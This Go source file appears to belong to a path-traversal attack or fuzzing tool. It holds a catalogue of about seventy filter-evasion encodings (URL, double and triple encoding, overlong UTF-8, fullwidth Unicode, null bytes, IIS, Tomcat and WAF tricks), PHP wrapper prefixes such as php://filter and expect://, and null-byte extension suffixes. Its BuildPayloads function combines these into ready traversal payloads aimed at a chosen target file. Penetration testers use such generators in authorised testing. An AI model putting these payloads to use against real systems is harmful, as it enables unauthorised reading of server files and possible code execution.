package encoding

import (
	"bufio"
	"os"
	"strings"
)

// Technique represents a traversal encoding variant.
type Technique struct {
	Name     string
	Sequence string
}

// Techniques lists ALL known traversal encoding bypass variants.
var Techniques = []Technique{
	// --- Basic ---
	{"plain", "../"},
	{"backslash", "..\\"},
	{"forward-double", "..//"},

	// --- URL Encoding (single) ---
	{"url-slash", "..%2f"},
	{"url-full", "%2e%2e%2f"},
	{"url-dot-only", "%2e%2e/"},
	{"url-backslash", "..%5c"},
	{"url-backslash-full", "%2e%2e%5c"},

	// --- URL Encoding (double) ---
	{"double-url-slash", "..%252f"},
	{"double-url-full", "%252e%252e%252f"},
	{"double-url-backslash", "..%255c"},
	{"double-url-backslash-full", "%252e%252e%255c"},

	// --- URL Encoding (triple) ---
	{"triple-url-slash", "..%25252f"},
	{"triple-url-full", "%25252e%25252e%25252f"},

	// --- Overlong UTF-8 ---
	{"overlong-slash-2byte", "..%c0%af"},
	{"overlong-dot-slash-2byte", "%c0%ae%c0%ae%c0%af"},
	{"overlong-slash-3byte", "..%e0%80%af"},
	{"overlong-dot-3byte", "%e0%80%ae%e0%80%ae%e0%80%af"},
	{"overlong-slash-4byte", "..%f0%80%80%af"},
	{"overlong-backslash-2byte", "..%c1%9c"},
	{"overlong-backslash-3byte", "..%e0%80%9c"},

	// --- Unicode / fullwidth ---
	{"fullwidth-slash", "..%ef%bc%8f"},
	{"fullwidth-dot-slash", "%ef%bc%8e%ef%bc%8e%ef%bc%8f"},
	{"fullwidth-backslash", "..%ef%bc%bc"},
	{"utf8-two-dot-leader", "\u2025/"},
	{"utf8-horizontal-ellipsis", "\u2026/"},

	// --- Null byte injection ---
	{"null-mid", "../%00"},
	{"null-before-slash", "..%00/"},
	{"null-between-dots", ".%00./"},

	// --- Mixed separators ---
	{"mixed-fwd-back", "..\\/"},
	{"mixed-back-fwd", "../\\"},

	// --- Filter evasion (double/triple dot) ---
	{"double-dot-double-slash", "....//"},
	{"double-dot-backslash", "....\\\\"},
	{"triple-dot", ".../.../"},
	{"dot-slash-dot-dot-slash", "./../"},
	{"dot-dot-slash-dot", "../."},
	{"stripped-double", "....//....//"},

	// --- Case variation (IIS) ---
	{"dot-DOT-slash", "..%2F"},
	{"DOT-dot-slash", "%2E%2E/"},
	{"DOT-dot-backslash", "%2E%2E\\"},

	// --- Java / Tomcat specific ---
	{"semicolon-bypass", "..;/"},
	{"semicolon-param", "..;foo=bar/"},
	{"url-semicolon", "..%3b/"},

	// --- Spring / Java normalization ---
	{"dot-segment-removal", "/../../"},
	{"double-slash-prefix", "//../"},

	// --- nginx / off-by-slash ---
	{"nginx-alias", "../"},

	// --- IIS specific ---
	{"iis-tilde", "..%u002f"},
	{"iis-unicode-slash", "..%u2215"},
	{"iis-unicode-backslash", "..%u2216"},
	{"iis-double-percent", "..%%35%63"},
	{"iis-double-percent-2", "..%%35c"},

	// --- PHP wrappers (prefix-style) ---
	{"php-filter-b64", "php://filter/convert.base64-encode/resource="},
	{"php-filter-rot13", "php://filter/string.rot13/resource="},
	{"php-filter-utf7", "php://filter/convert.iconv.UTF-8.UTF-7/resource="},
	{"php-input", "php://input"},
	{"php-data-b64", "data://text/plain;base64,"},
	{"php-expect", "expect://"},

	// --- Tomcat / Jetty normalization ---
	{"slash-dot-dot-slash", "/./../"},
	{"backslash-dot-dot-backslash", "\\.\\..\\"},
	{"encoded-slash-dot-dot", "%2f..%2f"},

	// --- WAF bypass combos ---
	{"tab-bypass", "..\t./"},
	{"cr-bypass", "..\r./"},
	{"lf-bypass", "..\n./"},
	{"space-bypass", ".. /"},
	{"plus-as-space", "..+/"},

	// --- Length-based filter evasion ---
	{"long-utf8-padding", "..%c0%ae%c0%ae%c0%ae%c0%ae%c0%af"},
}

// BypassSuffix is a null-byte or extension bypass appended after the file path.
type BypassSuffix struct {
	Name   string
	Suffix string
}

// BypassSuffixes lists available bypass suffixes.
var BypassSuffixes = []BypassSuffix{
	{"none", ""},
	{"null-byte", "%00"},
	{"null-php", "%00.php"},
	{"null-html", "%00.html"},
	{"null-jpg", "%00.jpg"},
	{"null-png", "%00.png"},
	{"null-pdf", "%00.pdf"},
	{"null-txt", "%00.txt"},
	{"hash-truncate", "#"},
	{"question-truncate", "?"},
	{"question-ext", "?.php"},
	{"encoded-null", "\x00"},
}

// Payload is a single generated traversal payload with metadata.
type Payload struct {
	Value    string
	Encoding string
	Depth    int
	Suffix   string
}

// BuildPayloads generates all traversal payloads for a target file.
func BuildPayloads(targetFile string, maxDepth int, encodingNames []string, useBypasses bool) []Payload {
	techs := Techniques
	if len(encodingNames) > 0 {
		nameSet := make(map[string]bool)
		for _, n := range encodingNames {
			nameSet[n] = true
		}
		var filtered []Technique
		for _, t := range Techniques {
			if nameSet[t.Name] {
				filtered = append(filtered, t)
			}
		}
		if len(filtered) > 0 {
			techs = filtered
		}
	}

	suffixes := []BypassSuffix{{"none", ""}}
	if useBypasses {
		suffixes = BypassSuffixes
	}

	// Handle PHP wrapper techniques differently - they're prefixes, not traversals
	phpPrefixes := map[string]bool{
		"php-filter-b64": true, "php-filter-rot13": true, "php-filter-utf7": true,
		"php-input": true, "php-data-b64": true, "php-expect": true,
	}

	var payloads []Payload
	for _, tech := range techs {
		if phpPrefixes[tech.Name] {
			// PHP wrappers: emit once with the target file (no depth iteration)
			for _, sfx := range suffixes {
				payloads = append(payloads, Payload{
					Value:    tech.Sequence + targetFile + sfx.Suffix,
					Encoding: tech.Name,
					Depth:    1,
					Suffix:   sfx.Name,
				})
			}
			continue
		}

		traversal := ""
		for depth := 1; depth <= maxDepth; depth++ {
			traversal += tech.Sequence
			for _, sfx := range suffixes {
				payloads = append(payloads, Payload{
					Value:    traversal + targetFile + sfx.Suffix,
					Encoding: tech.Name,
					Depth:    depth,
					Suffix:   sfx.Name,
				})
			}
		}
	}
	return payloads
}

// LoadWordlist reads a file of target paths (one per line).
func LoadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

// ListEncodings returns all technique names and sequences.
func ListEncodings() []Technique {
	return Techniques
}
